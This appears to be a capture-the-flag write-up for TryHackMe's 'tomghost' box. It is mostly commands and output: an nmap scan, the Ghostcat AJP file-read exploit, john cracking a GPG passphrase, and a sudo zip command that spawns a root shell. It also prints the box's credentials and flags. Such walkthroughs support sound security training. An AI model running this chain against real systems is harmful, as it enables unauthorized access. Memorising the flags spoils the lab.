Nmap Scan 

root@natzsec:~/Desktop/tryhackme/boxes/tomghost# nmap -p- -sC -sV -oA nmap/all 10.10.4.80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-16 08:20 IST
Stats: 0:06:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 57.30% done; ETC: 08:32 (0:05:04 remaining)
Nmap scan report for 10.10.4.80
Host is up (0.21s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 896.13 seconds
root@natzsec:~/Desktop/tryhackme/boxes/tomghost#

 http://10.10.4.80:8080 shows only default tomcat page.

 gobuster only reveals the default tomcat directories and nothing intresting.

 http://10.10.4.80:8009/ also shows connection was reset.

 There were not public exploits or any CMS on the 8080 port to work with.

 But the service ajp13 is having a CVE. 

 A quick google lead us to the https://nvd.nist.gov/vuln/detail/CVE-2020-1938

 There is a python code POC also available which is github for this CVE.

 Cloned it to my current folder. : https://github.com/00theway/Ghostcat-CNVD-2020-10487

 And ran the command as it was given in the example to read the /WEB-INF/web.xml which revealed the password.

 <?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

Now we have the password for an user skyfuck. we can try to use it on the ssh.

skyfuck:8730281lkjlkjdqlksalks

root@natzsec:~/Desktop/tryhackme/boxes/tomghost# ssh skyfuck@10.10.4.80
The authenticity of host '10.10.4.80 (10.10.4.80)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.4.80' (ECDSA) to the list of known hosts.
skyfuck@10.10.4.80's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 

Now we are now in the ssh.

skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}

Runnign linpeas did not give much so, when looked in the home directory of skyfuck we can see there are .asc and .gpg files.

downloaded them to our current directory on our machine.

First converted the tryhackme.asc to john's recognisable format so that we can crack the password.

root@natzsec:~/Desktop/tryhackme/boxes/tomghost# gpg2john tryhackme.asc > hash.txt

File tryhackme.asc
root@natzsec:~/Desktop/tryhackme/boxes/tomghost# cat hash.txt 
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

Using john to crak the password and it was quick.

root@natzsec:~/Desktop/tryhackme/boxes/tomghost# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2020-05-16 09:59) 14.28g/s 15314p/s 15314c/s 15314C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@natzsec:~/Desktop/tryhackme/boxes/tomghost# 

passowrd: alexandru

Now we need to retrieve the password from the encrypted file which is credentials.pgp.

To do that we need to use gpg to import the tryhackme.asc and enter the password which we cracked.

Once the secret key is imported we can then use gpg to decrypt the file credential.pgp to get the username and password.

root@natzsec:~/Desktop/tryhackme/boxes/tomghost# gpg --import tryhackme.asc 
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
root@natzsec:~/Desktop/tryhackme/boxes/tomghost# gpg --decrypt credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jroot@natzsec:~/Desktop/tryhackme/boxes/tomghost# 

Username : merlin
Password : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

Running linpeas as merlin shows that we can use sudo to run /usr/bin/zip

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

Our GTFOBINS had a specifc command to gain the root shell on this machine.

https://gtfobins.github.io/gtfobins/zip/#shell

merlin@ubuntu:~$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
# ifconfig
eth0      Link encap:Ethernet  HWaddr 02:9b:e0:ba:01:72  
          inet addr:10.10.4.80  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::9b:e0ff:feba:172/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:334091 errors:0 dropped:0 overruns:0 frame:0
          TX packets:317377 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:39555814 (39.5 MB)  TX bytes:213922414 (213.9 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

# ls -la /root
total 32
drwx------  4 root root 4096 Mar 10 22:58 .
drwxr-xr-x 22 root root 4096 Mar 10 18:09 ..
-rw-------  1 root root   15 Mar 10 22:58 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Mar 10 18:22 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   17 Mar 10 22:26 root.txt
drwxr-xr-x  2 root root 4096 Mar 10 22:25 ufw
# cat /root/root.txt
THM{Z1P_1S_FAKE}
# 


